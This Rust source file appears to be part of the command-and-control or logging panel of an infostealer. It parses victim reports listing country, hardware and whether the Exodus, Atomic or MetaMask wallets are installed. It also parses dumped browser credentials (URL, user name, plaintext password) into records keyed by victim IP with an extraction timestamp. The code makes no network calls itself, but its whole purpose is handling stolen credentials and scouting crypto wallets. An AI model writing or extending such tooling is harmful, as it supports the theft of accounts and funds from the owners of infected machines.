use anyhow::{Result, Context};
use chrono::{DateTime, Utc};
use std::collections::HashMap;
use crate::{ClientInfo, PasswordEntry};

/// Parse client data from the protocol format: Country|OS|GPU|CPU|Exists1|Exists2|Exists3
pub fn parse_client_data(client_ip: &str, data: &str) -> Result<ClientInfo> {
    let parts: Vec<&str> = data.split('|').collect();
    
    if parts.len() < 7 {
        return Err(anyhow::anyhow!("Invalid client data format. Expected 7 parts, got {}", parts.len()));
    }
    
    let country = parts[0].to_string();
    let os = parts[1].to_string();
    let gpu = parts[2].to_string();
    let cpu = parts[3].to_string();
    let wallet_exodus = parts[4] == "1";
    let wallet_atomic = parts[5] == "1";
    let wallet_metamask = parts[6] == "1";
    
    let mut client = ClientInfo::new(
        client_ip.to_string(),
        country,
        os,
        gpu,
        cpu,
    );
    
    client.wallet_exodus = wallet_exodus;
    client.wallet_atomic = wallet_atomic;
    client.wallet_metamask = wallet_metamask;
    
    Ok(client)
}

/// Parse password entries from a password file
pub fn parse_password_file(content: &str, client_ip: &str) -> Result<Vec<PasswordEntry>> {
    let mut passwords = Vec::new();
    let lines: Vec<&str> = content.lines().collect();
    let mut current_entry: HashMap<String, String> = HashMap::new();
    
    for line in lines {
        let line = line.trim();
        
        if line == "==================================================" {
            // End of entry, process it
            if !current_entry.is_empty() {
                if let Ok(password_entry) = create_password_entry(&current_entry, client_ip) {
                    passwords.push(password_entry);
                }
                current_entry.clear();
            }
        } else if line.contains(':') {
            // Parse key-value pair
            if let Some(colon_pos) = line.find(':') {
                let key = line[..colon_pos].trim().to_string();
                let value = line[colon_pos + 1..].trim().to_string();
                current_entry.insert(key, value);
            }
        }
    }
    
    // Handle the last entry if there is one
    if !current_entry.is_empty() {
        if let Ok(password_entry) = create_password_entry(&current_entry, client_ip) {
            passwords.push(password_entry);
        }
    }
    
    Ok(passwords)
}

/// Create a password entry from parsed data
fn create_password_entry(data: &HashMap<String, String>, client_ip: &str) -> Result<PasswordEntry> {
    let url = data.get("URL").unwrap_or(&String::new()).clone();
    let web_browser = data.get("Web Browser").unwrap_or(&String::new()).clone();
    let username = data.get("User Name").unwrap_or(&String::new()).clone();
    let password = data.get("Password").unwrap_or(&String::new()).clone();
    let strength = data.get("Password Strength").unwrap_or(&String::new()).clone();
    
    // Parse created time if available
    let created_time = data.get("Created Time")
        .and_then(|time_str| {
            // Try multiple date formats
            chrono::DateTime::parse_from_rfc3339(time_str).ok()
                .or_else(|| chrono::DateTime::parse_from_str(time_str, "%Y-%m-%d %H:%M:%S").ok())
                .or_else(|| chrono::DateTime::parse_from_str(time_str, "%m/%d/%Y %H:%M:%S").ok())
                .map(|dt| dt.with_timezone(&Utc))
        });
    
    Ok(PasswordEntry {
        id: uuid::Uuid::new_v4(),
        client_ip: client_ip.to_string(),
        url,
        web_browser,
        username,
        password,
        strength,
        created_time,
        extracted_time: Utc::now(),
    })
}

/// Format file size in human readable format
pub fn format_file_size(bytes: u64) -> String {
    const SIZES: &[&str] = &["B", "KB", "MB", "GB", "TB"];
    let mut len = bytes as f64;
    let mut order = 0;
    
    while len >= 1024.0 && order < SIZES.len() - 1 {
        order += 1;
        len /= 1024.0;
    }
    
    format!("{:.2} {}", len, SIZES[order])
}